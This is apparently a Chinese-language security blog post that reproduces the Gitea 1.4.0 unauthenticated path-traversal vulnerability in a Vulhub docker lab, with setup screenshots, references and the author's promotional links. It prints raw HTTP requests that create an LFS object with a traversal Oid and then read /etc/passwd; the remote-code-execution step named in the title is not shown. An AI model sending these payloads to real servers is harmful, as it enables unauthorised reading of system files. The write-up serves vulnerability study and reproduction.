![v2-bd1a78b4fffdbd33f6258274addfd346_1440w.png](https://image.3001.net/images/20210212/1613099321_6025f13941353f0996b13.png!small)

​Gitea 1.4 未授权远程代码执行

一、漏洞描述

Gitea是从gogs衍生出的一个开源项目，是一个类似于Github、Gitlab的多用户Git仓库管理平台。其1.4.0版本中有一处逻辑错误，导致未授权用户可以穿越目录，读写任意文件，最终导致执行任意命令。

二、影响版本

1.4.0

三、环境准备&&漏洞复现

Vulhub进行搭建

https://github.com/vulhub/vulhub/tree/master/gitea/1.4-rce安装镜像docker-compose
up -d

环境启动成功

![v2-18740affdaadc73a0937b61c1f04ddcf_1440w.png](https://image.3001.net/images/20210212/1613099321_6025f1399ca18b0843c7a.png!small)

初始化配置：

http://192.168.1.108:3000/install

![v2-35a1238d54bf36f2fc6c9d54ed4ffa98_1440w.png](https://image.3001.net/images/20210212/1613099322_6025f13a188fb30dab7a6.png!small)

其他默认设置一下管理员账户密码：

![v2-8ea8c692dc800ed9ba4713edfffd6cef_1440w.png](https://image.3001.net/images/20210212/1613099322_6025f13a73fbdba890f00.png!small)

初始化完成成功进去面板

![v2-5c4e3a8318d7c72ed3bc53e9b08d47c4_1440w.png](https://image.3001.net/images/20210212/1613099323_6025f13b4b4909a2377b0.png!small)

安装完成后，新建一个用户，然后创建一个公开的仓库

![v2-1835bb2f32ae371ec8d8e2505eb116aa_1440w.png](https://image.3001.net/images/20210212/1613099323_6025f13bb7e8db78c8e7f.png!small)

创建一个公开的仓库

![v2-ce9664fde89f6f5a5f91d379e07986f5_1440w.png](https://image.3001.net/images/20210212/1613099324_6025f13c295a85d7d6fda.png!small)

仓库创见成功

![v2-20f21e4d9deeedbdd76165840a32caff_1440w.png](https://image.3001.net/images/20210212/1613099324_6025f13ce8e41cc7defd5.png!small)

需要重启一下重启gitea服务

docker-compose restart

![v2-17a68476e45057fb315a19eca7609203_1440w.png](https://image.3001.net/images/20210212/1613099325_6025f13d4dcfb2b7d09f0.png!small)

漏洞验证：

![v2-67bd5461cb1cf6a675afc7dbe8459f8b_1440w.png](https://image.3001.net/images/20210212/1613099325_6025f13da779a96f37734.png!small)

具体数据包：

POST/lostworld/getpasswd.git/info/lfs/objectsHTTP/1.1Host:
192.168.1.108:3000Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.52Accept:
application/vnd.git-lfs+jsonAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: lang=zh-CN;
i_like_gitea=7b3a3994aeff5ed0; _csrf=lA-gqD5gapHJeeQEz_XUOsejTSY6MTYwOTk4NzQ3MTAwNDc0MzE3OQ%3D%3DConnection:
closeContent-Length:
153​{"Oid":"....../../../etc/passwd","Size":1000000,"User":"a","Password":"a","Repo":"a","Authorization":"a"}

出现401说明发送数据包LFS对象已经创建成功，且其Oid为....../../../etc/passwd。

访问路径

http://192.168.1.108:3000/admins/test.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth

![v2-4bb7d16362df49a3faf2b4407031c374_1440w.png](https://image.3001.net/images/20210212/1613099326_6025f13ecdcf15b9f8d27.png!small)

具体读取数据包

GET/lostworld/getpasswd.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sthHTTP/1.1Host:
192.168.1.108:3000Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.52Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: lang=zh-CN;
i_like_gitea=19fae7187e6a86e2;
_csrf=y0uGd4qsOuq8esEW9S4hXHWRGHo6MTYwOTk4ODAwNzczODc4NzI3MQ%3D%3DConnection:
close

参考：

https://github.com/vulhub/vulhub/tree/master/gitea/1.4-rce

https://mp.weixin.qq.com/s/vsQsATBNbOkyVmTgm-zU2w

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![v2-2fd29902f9e696422dbb34fe44673324_1440w.jpg](https://image.3001.net/images/20210212/1613099328_6025f140592bc29f2e3e0.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

![v2-7a303c96c8a61e6a94b37c09395e01d8_1440w.png](https://image.3001.net/images/20210212/1613099328_6025f140a452059f49272.png!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

![v2-a947eda3cf7d89649a5d3853fa4cfdd9_1440w.png](https://image.3001.net/images/20210212/1613099328_6025f140e6de93d86a9ea.png!small)

2021近期往期内容：

[MinIO未授权SSRF漏洞(CVE-2021-21287)](http://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247485131&idx=1&sn=6af111e9fb0ea50efa9764247ed18a9f&chksm=e869e5a6df1e6cb00fc031412dbadc3a8cbca8cea5117f65e77fc97cf1c37cceb680eb39ea9d&scene=21#wechat_redirect)

[Apache Druid
命令执行漏洞（CVE-2021-25646）复现](http://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247485107&idx=1&sn=f4d1c6e93537b06fef818370bbe160eb&chksm=e869e5dedf1e6cc8fa6f4e5f3c66ca0a94adf0b08af645dc7f9a48b0a0017f042de1320e84d7&scene=21#wechat_redirect)

[Linux
sudo权限提升漏洞（CVE-2021-3156）复现](http://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247485088&idx=1&sn=5a212e4471fcddcfc9adf3279558dd56&chksm=e869e5cddf1e6cdb2211417164c66469903257f06506a0e1f00312b73c5f65d8d6c30d445092&scene=21#wechat_redirect)

[CVE-2021-3129-Laravel Debug mode
远程代码执行漏洞](http://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247485076&idx=1&sn=ed68992910c22746bd948bf499b8488f&chksm=e869e5f9df1e6cef59c6827478d6fc73aa67e2cd41235873b31483e7dc0503e50c8212646786&scene=21#wechat_redirect)

[SonicWall SSL-VPN
远程命令执行漏洞](http://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247485008&idx=1&sn=a05d8db20395e233f7a66bb27e0195f5&chksm=e869e53ddf1e6c2b1d626acf16b3e92712a2ced1843407eae257a0ce36319104cfdc2a2fd4a6&scene=21#wechat_redirect)

[CVE-2021-2109 Weblogic
Server远程代码执行](http://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247484986&idx=1&sn=141fdcdcb27ad4d06ba6b34a9f618e5c&chksm=e869e557df1e6c4154286bc8eba8473a583b47ebee7cd6b2f290d4cf675545d1ad0d031f3307&scene=21#wechat_redirect)

[Apache Flink
(文件写入漏洞/文件读取漏洞)CVE-2020-17518/17519](http://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247484946&idx=1&sn=2fb8d291edcb1d293c104bf7be25632d&chksm=e869e57fdf1e6c698bee70a7dd6ed1d67fe12210aeb4131b23f22d845a7b60c57c86985a9959&scene=21#wechat_redirect)

